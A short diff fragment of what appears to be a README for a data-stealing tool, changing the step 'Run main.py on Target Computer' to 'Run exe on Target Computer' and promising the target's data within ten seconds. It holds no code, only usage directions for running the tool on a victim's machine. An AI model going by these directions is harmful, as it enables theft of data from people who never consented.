@@ -33,7 +33,7 @@ pip install glob
 ![github-small](/images/pass.png)
 
 
-•**Run main.py on Target Computer**
+•**Run exe on Target Computer**
 
 •**In 10 seconds,You Get the Data from the Target Computer**
 
